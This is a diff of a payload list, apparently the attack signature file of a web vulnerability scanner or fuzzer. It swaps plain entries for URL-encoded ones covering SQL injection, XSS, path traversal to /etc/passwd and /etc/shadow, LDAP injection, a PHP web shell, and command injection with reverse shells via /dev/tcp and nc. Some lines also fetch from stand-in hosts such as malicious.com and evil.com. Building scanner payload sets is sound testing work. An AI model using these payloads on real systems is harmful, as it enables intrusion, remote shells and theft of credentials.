@@ -1,45 +1,28 @@
 whois_raw.cgi#whois_raw.cgi?fqdn=%0acat%20/etc/passwd
 faxsurvey#faxsurvey?/bin/cat%20/etc/passwd
-File Inclusion#../../../../etc/passwd
-Remote Command Execution#;wget http://malicious.com
-SQL Injection#UNION SELECT
-SQL Injection#SELECT * FROM users WHERE username = 'admin' --
-XSS#<script>alert('XSS')</script>
-XSS#<img src=x onerror=alert('XSS')>
-Local File Disclosure#file:///etc/passwd
-Command Injection#; nc -e /bin/sh
-Remote Code Execution#<?php system($_GET['cmd']); ?>
-SQL Injection#1' OR '1'='1
-SQL Injection#' OR 1=1 --
-Directory Traversal#../etc/passwd
-Path Traversal#../../../../../../etc/shadow
-LDAP Injection#*)(|(cn=*)
-SQL Injection#xp_cmdshell
-Shell Injection#| /bin/bash -i >& /dev/tcp/
-Remote File Inclusion#http://malicious.com/shell.txt
-SQL Injection#' UNION SELECT null, version() --
-XSS#<body onload=alert('XSS')>
-Command Injection#`wget http://malicious.com`
-SQL Injection#UNION ALL SELECT
-XSS#<iframe src=javascript:alert('XSS')>
-Command Injection#| nc -e /bin/bash
-SQL Injection#' AND 1=1 --
-XSS#<link rel=stylesheet href=javascript:alert('XSS')>
-Remote File Inclusion#http://example.com/shell.txt?
-SQL Injection#1' AND '1'='1
-XSS#<script>alert(document.cookie)</script>
-Command Injection#; /bin/bash -c
-SQL Injection#; EXEC xp_cmdshell
-Path Traversal#../../../windows/system32/cmd.exe
-LDAP Injection#*)(objectClass=*
-SQL Injection#UNION SELECT NULL, NULL
-Shell Injection#| bash -i >& /dev/tcp/
-Remote File Inclusion#http://example.com/shell.php
-SQL Injection#' OR 'a'='a
-XSS#<style>@import'javascript:alert('XSS')'</style>
-Command Injection#; /bin/bash -i > /dev/tcp/
-SQL Injection#' OR ''='
-XSS#<img src="javascript:alert('XSS')">
-Remote File Inclusion#http://evil.com/shell.pl
-SQL Injection#OR 1=1
-XSS#<svg onload=alert('XSS')>
+sql_injection#%27%20OR%20%271%27=%271
+sql_union#UNION%20SELECT%20null,%20null
+sql_error_based#%27%20OR%201=1;--
+xss_simple#%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
+xss_image#%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E
+xss_iframe#%3Ciframe%20src=javascript:alert(%27XSS%27)%3E
+lfi_simple#../../../../etc/passwd
+lfi_php#file=../../../../etc/passwd
+rfi_php#include=http://malicious.com/shell.txt
+rce_wget#%7C%20wget%20http://malicious.com
+rce_nc#%7C%20nc%20-e%20/bin/sh
+rce_bash#%7C%20/bin/bash%20-i%20%3E%26%20/dev/tcp/0.0.0.0/1234%200%3E%261
+ldap_injection#%2A%29%28%7C%28cn=%2A%29%29
+command_injection#;%20/bin/bash%20-c%20%27cat%20/etc/passwd%27
+sqli_blind#1%27%20AND%201=1--
+sqli_time#1%27%20WAITFOR%20DELAY%20%270:0:5%27--
+xss_style#%3Cstyle%3E@import%27javascript:alert(%27XSS%27)%27%3C/style%3E
+cmd_exec_php#%3Fphp=system(%24_GET[%27cmd%27]);%3E
+xss_body#%3Cbody%20onload=alert(%27XSS%27)%3E
+sql_bool_based#%27%20OR%201=1%20--
+sql_time_based#%27;%20WAITFOR%20DELAY%20%270:0:5%27%20--
+xss_svg#%3Csvg%20onload=alert(%27XSS%27)%3E
+xss_link#%3Clink%20rel=stylesheet%20href=javascript:alert(%27XSS%27)%3E
+xss_cookie#%3Cscript%3Ealert(document.cookie)%3C/script%3E
+php_rce#%3Fphp=system(%24_GET[%27cmd%27]);%3E
+file_inclusion#file=http://example.com/shell.txt?
